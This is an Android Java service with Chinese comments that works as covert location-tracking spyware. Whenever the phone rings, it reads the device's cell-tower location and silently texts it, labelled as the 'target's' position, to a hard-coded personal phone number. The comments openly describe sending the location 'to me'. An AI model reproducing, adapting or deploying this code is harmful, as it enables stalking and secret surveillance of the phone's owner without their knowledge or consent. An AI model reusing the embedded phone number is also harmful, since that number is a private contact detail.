package com.xample.android_listener;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.telecom.TelecomManager;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.core.app.ActivityCompat;

public class MyService extends Service {
    public MyService() {
    }
    String location;
    @Override
    public void onCreate() {
        super.onCreate();
        //获取手机服务
        TelephonyManager tm =
                (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        // 获取信号基站地址
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        location = tm.getCellLocation().toString();
        // 为手机通话状态添加一个监听事件
        tm.listen(new PhoneListen(),PhoneStateListener.LISTEN_CALL_STATE);
    }

    class PhoneListen extends PhoneStateListener {
        @Override
        public void onCallStateChanged(int state, String phoneNumber) {
            super.onCallStateChanged(state, phoneNumber);
            switch (state) {
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    // 手机通话中
                    System.out.println("----手机通话中----");
                    break;
                case TelephonyManager.CALL_STATE_IDLE:
                    // 手机空闲中
                    System.out.println("----手机空闲中----");
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    // 手机响铃中
                    System.out.println("----手机响铃中----");

                    // 把位置以短信方式发送给我
                    SmsManager sm = SmsManager.getDefault();
                    PendingIntent p = PendingIntent.getActivity(MyService.this,
                            0, new Intent(), 0);
                    sm.sendTextMessage("15727266373" ,null,
                            "当前目标位置是"+location,p,null);
                    break;

            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
